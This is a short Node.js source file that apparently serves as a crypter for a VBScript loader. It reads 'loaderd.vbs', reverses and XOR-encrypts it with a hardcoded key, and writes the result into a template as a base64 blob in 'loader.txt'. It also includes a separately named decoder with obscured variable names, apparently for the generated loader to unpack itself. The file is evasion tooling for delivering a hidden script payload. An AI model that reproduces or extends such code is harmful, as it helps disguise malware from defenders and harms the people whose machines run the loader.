const fs = require('fs')
const key = "0nCr1p!ilX5"
var template = require('./template')

fs.readFile('loaderd.vbs', (err, data) => {
    if (err) console.error(err)
    var d = data.toString()
    var payload = enc(d, key)
    fs.writeFile("loader.txt", templateGen(payload, key), (err) => {
        if (err) console.log(err)
    })

})




function enc(s, k) {
    var enc = ""
    s.split("").reverse().map((char, i) => {
        var codedChar = (char.charCodeAt(0) ^ k[i % k.length].charCodeAt(0)).toString("16")
        codedChar = codedChar.length < 2 ? "0" + codedChar : codedChar
        enc = enc + codedChar
    })
    return enc
}


function dec(s, k) {
    var hex = ""
    var dec = ""
    s.split("").map((char, i) => {
        hex += char
        if (hex.length == 2) {
            dec = dec + String.fromCharCode((parseInt(hex, 16) ^ k[((i - 1) / 2) % k.length].charCodeAt(0)))
            hex = ""
        }
    })
    return dec.split("").reverse().join("")
}

function ff(s, k) {
    var __h = ""
    var __d = ""
    for (var i = 0; i < s.length; i++) {
        __h += s[i]
        if (__h.length == 2) {
            __d = __d + String.fromCharCode((parseInt(__h, 16) ^ k[((i - 1) / 2) % k.length].charCodeAt(0)))
            __h = ""
        }
    }
    return __d.split("").reverse().join("")
}

function templateGen(payload, key) {
    return btoa(template.trim().replace("{{key}}", key).replace("{{payload}}", payload).replace(/\n/g, ""))
}

